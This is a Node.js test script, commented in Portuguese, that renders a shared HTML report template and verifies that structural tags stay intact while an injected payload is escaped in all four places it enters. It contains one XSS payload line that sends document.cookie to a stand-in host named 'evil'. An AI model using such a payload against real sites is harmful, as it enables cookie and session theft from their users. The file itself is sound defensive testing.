// Renderiza o template COMPARTILHADO de relatorio (src/utils/report-templates.ts) com dados de
// verdade + um payload de ataque, e exige as duas coisas ao mesmo tempo:
//
//   1. o HTML continua HTML  (as tags NAO podem ter sido escapadas — seria o relatorio saindo
//      como codigo-fonte na tela, que e o modo de falha visivel da tag `h`);
//   2. o payload NAO vira tag (achado 6).
//
// Roda: node scratchpad/sim_relatorio_render.mjs
import { execSync } from 'node:child_process'
import fs from 'node:fs'

const DIR = 'scratchpad/_sim'

// ⚠️ `tsc` avulso nao resolve o alias `@/` do projeto — precisa de baseUrl+paths, e a CLI nao
// aceita `paths` como argumento. Daí o tsconfig temporario.
const TSCONFIG = `${DIR}/tsconfig.render.json`
fs.mkdirSync(DIR, { recursive: true })
fs.writeFileSync(TSCONFIG, JSON.stringify({
  compilerOptions: {
    outDir: '.', module: 'esnext', target: 'es2020', moduleResolution: 'bundler',
    skipLibCheck: true, baseUrl: '../..', paths: { '@/*': ['src/*'] },
  },
  files: ['../../src/utils/report-templates.ts', '../../src/utils/htmlSeguro.ts'],
}, null, 2))
execSync(`npx tsc -p ${TSCONFIG}`, { stdio: 'inherit' })

// o alias @/utils/... nao existe fora do bundler: aponta para o arquivo irmao
const gerado = `${DIR}/report-templates.js`
fs.writeFileSync(gerado,
  fs.readFileSync(gerado, 'utf8').replace(/['"]@\/utils\/htmlSeguro['"]/g, "'./htmlSeguro.js'"),
  'utf8')

const { getReportBaseHtml, templates } = await import('./_sim/report-templates.js')

const ATAQUE = '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'

const config = {
  title: `Relatório ${ATAQUE}`,
  filters: { Unidade: ATAQUE, Setor: 'BLOCO A', Competência: '08/2026' },
  generationDate: '30/08/2026 14:03:11',
  draft: true,
}

const dadosConsolidado = [
  { unidade: `SMS ${ATAQUE}`, setor: 'TI', regular: 160, extra: 12, plantao: 24, sobreaviso: 3, totalGeral: 199 },
  { unidade: 'LACEM', setor: 'ANÁLISES', regular: 180, extra: 0, plantao: 0, sobreaviso: 0, totalGeral: 180 },
]

const html = String(getReportBaseHtml(config, templates.consolidado(dadosConsolidado)))

const casos = []
const caso = (nome, ok, detalhe = '') => casos.push({ nome, ok, detalhe })

// ── 1) O RELATORIO CONTINUA SENDO HTML
caso('DOCTYPE presente', html.includes('<!DOCTYPE html>'))
caso('<table> nao foi escapado', html.includes('<table') && !html.includes('&lt;table'))
caso('<tr>/<td> nao foram escapados', /<tr[\s>]/.test(html) && /<td[\s>]/.test(html))
caso('a marca d agua (raw) saiu como markup', html.includes('<div class="watermark'))
caso('o selo de Previsao (raw) saiu como markup', /<span[^>]*>Previsão<\/span>/.test(html))
caso('classes do Tailwind intactas', html.includes('class="watermark no-print"'))
caso('acentuacao preservada', html.includes('ANÁLISES') && html.includes('Competência'))

// ── 2) O PAYLOAD FOI NEUTRALIZADO, EM TODOS OS SITIOS ONDE ENTROU
caso('nenhuma tag <img> injetada', !/<img\s/i.test(html), 'o payload viraria <img src=x onerror=...>')
caso('o payload aparece escapado (title)', html.includes('&lt;img src=x onerror='))

// ⚠️ Procurar `onerror=` cru NAO serve como asserção: a palavra aparece de propósito no TEXTO
// escapado (`&lt;img src=x onerror=&quot;...`), e ali ela é inerte. O que precisa ser verdade é
// que TODA ocorrência esteja dentro de texto escapado — nenhuma dentro de uma tag de verdade.
const totalOnerror = (html.match(/onerror/gi) || []).length
const onerrorEscapados = (html.match(/&lt;img src=x onerror/gi) || []).length
caso('todo `onerror` está em texto escapado, nenhum dentro de tag',
  totalOnerror > 0 && totalOnerror === onerrorEscapados,
  `total: ${totalOnerror}, escapados: ${onerrorEscapados}`)

// O payload entrou em 4 sítios, não 3: `config.title` é renderizado DUAS vezes (no <title> do
// head e no <h1> do cabeçalho), além do filtro Unidade e do dado da linha.
const ocorrenciasEscapadas = (html.match(/&lt;img src=x onerror=/g) || []).length
caso('as 4 entradas do payload foram escapadas', ocorrenciasEscapadas === 4,
  `escapadas: ${ocorrenciasEscapadas}`)

// ── 3) REDE DE SEGURANCA: nenhuma tag estrutural escapada por engano
const escapadasIndevidas = (html.match(/&lt;\/?(?:table|tr|td|th|div|span|thead|tbody)\b/g) || [])
caso('nenhuma tag estrutural foi escapada por engano', escapadasIndevidas.length === 0,
  escapadasIndevidas.slice(0, 5).join(' '))

let falhas = 0
for (const c of casos) {
  console.log(`  ${c.ok ? 'ok   ' : 'FALHA'}  ${c.nome}${c.detalhe && !c.ok ? '  [' + c.detalhe + ']' : ''}`)
  if (!c.ok) falhas++
}
console.log(`\n${casos.length - falhas}/${casos.length} casos passaram   (HTML gerado: ${html.length} chars)`)

if (falhas) {
  fs.writeFileSync(`${DIR}/relatorio_falhou.html`, html)
  console.error(`\nHTML gravado em ${DIR}/relatorio_falhou.html para inspecao`)
}
process.exit(falhas ? 1 : 0)
